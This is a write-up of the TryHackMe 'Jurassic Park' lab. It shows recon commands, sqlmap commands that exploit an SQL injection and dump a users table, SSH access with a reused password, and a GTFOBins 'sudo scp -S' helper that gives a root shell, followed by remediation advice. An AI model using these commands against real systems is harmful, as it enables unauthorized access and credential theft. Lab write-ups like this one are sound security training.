# Jurassic Park — TryHackMe Writeup

> **Room:** [Jurassic Park](https://tryhackme.com/room/jurassicpark) · **Difficulty:** Medium–Hard
> **Category:** Web / SQL Injection · **Author of writeup:** 0xnyx
> **Goal:** Enumerate the shop, extract credentials via SQL injection, and find the flags across the file system.

> ⚠️ In line with TryHackMe's write-up policy, **no flags, passwords, or cracked values are included** — only the methodology.

---

## 1. Reconnaissance

```bash
nmap -sVC -T4 -Pn <TARGET>
```

- **22/tcp** — OpenSSH 7.2p2 (Ubuntu)
- **80/tcp** — Apache httpd 2.4.18 — *Jarassic Park*

Directory brute force:

```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
# shop.php, item.php, index.php, assets/, robots.txt
```

The home page points to an "online shop" (`shop.php`), which links to products via
`item.php?id=1`, `?id=2`, `?id=3`. The `id` parameter is the obvious injection point.

## 2. Finding the SQL injection

A single quote breaks the query — the MySQL error is hidden in an **HTML comment**:

```bash
curl -s "http://<TARGET>/item.php?id=1'" | grep -i error
# ... error in your SQL syntax ... near "%" at line N
```

The error `near "%"` shows the query wraps our input with a wildcard (roughly
`... LIKE '%$id%'`), and the page even trolls: *"Try SqlMap.. I dare you.."*.

Manual exploitation is awkward here: standard comments (`-- -`, `#`) appear to be
**filtered**, and the `id` value is used in more than one place in the query, so the trailing
`%'` is hard to neutralise by hand. This is exactly the case where an automated tool shines.

## 3. Exploitation with sqlmap

```bash
sqlmap -u "http://<TARGET>/item.php?id=1" --batch --dbs
```

sqlmap confirms the parameter is injectable (boolean-based, error-based, and time-based) and
lists the databases. The custom one serving the shop is **`park`** (answering the "name of the
SQL database" question).

Enumerate tables and columns:

```bash
sqlmap -u "http://<TARGET>/item.php?id=1" --batch -D park --tables
sqlmap -u "http://<TARGET>/item.php?id=1" --batch -D park --columns
```

- `items` — **5 columns** (id, information, package, price, sold) — the shop table.
- `users` — id, username, password.

Dump the credentials:

```bash
sqlmap -u "http://<TARGET>/item.php?id=1" --batch -D park -T users --dump
```

Two password hashes/strings come back. One of them is clearly **Dennis'** (the Jurassic Park
saboteur Dennis Nedry — the password is thematic, "I hate dinosaurs" style).

## 4. SSH as dennis

Credentials are reused for SSH:

```bash
ssh dennis@<TARGET>        # password from the users table
id                         # uid=1001(dennis)
grep PRETTY /etc/os-release # Ubuntu 16.04 — answers the "system version" question
```

Collect the flags reachable as `dennis`:

```bash
cat ~/flag1.txt                         # flag 1 (home directory)
cat /boot/grub/fonts/flagTwo.txt        # flag 2
cat ~/.bash_history                     # flag 3 is hidden in command history
```

> Always read `.bash_history` — secrets and flags are routinely left there.

## 5. Privilege escalation — sudo scp (GTFOBins)

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/scp
```

`scp` can run as root without a password, and its `-S` option lets you specify the program
used for the "SSH" transport — which then runs **as root** ([GTFOBins: scp](https://gtfobins.github.io/gtfobins/scp/)):

```bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF      # or any commands you want root to run
chmod +x $TF
sudo scp -S $TF x y:
```

> Note: `scp` consumes the helper's stdout as part of its protocol, so for a non-interactive
> grab, have the helper **write to a world-readable file** (e.g. copy `/root/flag5.txt` to
> `/tmp` and `chmod 666` it) instead of printing to the terminal.

This yields root and the final flag in `/root/flag5.txt`.

---

## Flags recap (locations only)

| Flag | Location |
|------|----------|
| 1 | `~/flag1.txt` (dennis home) |
| 2 | `/boot/grub/fonts/flagTwo.txt` |
| 3 | `~/.bash_history` |
| 4 | *does not exist (per the room)* |
| 5 | `/root/flag5.txt` (root) |

## Lessons

- A SQL error hidden in an HTML comment is still a confirmed injection — read the page source.
- When comments are filtered / the parameter is reused in multiple clauses, **sqlmap** (error/boolean/time-based) beats fighting the query by hand.
- **Credential reuse**: DB passwords often unlock SSH.
- Check `.bash_history` for leaked secrets.
- **GTFOBins** `sudo scp -S <script>` runs an arbitrary program as root.

## Remediation

- Use parameterized queries / prepared statements; never concatenate input into SQL.
- Don't expose DB errors to clients, even in comments.
- Don't reuse the same password between the database and system accounts.
- Clear shell history of secrets; store credentials in a secrets manager.
- Avoid `NOPASSWD` sudo on binaries with escape vectors (see GTFOBins).

---

*Write-up for [TryHackMe — Jurassic Park](https://tryhackme.com/room/jurassicpark).*
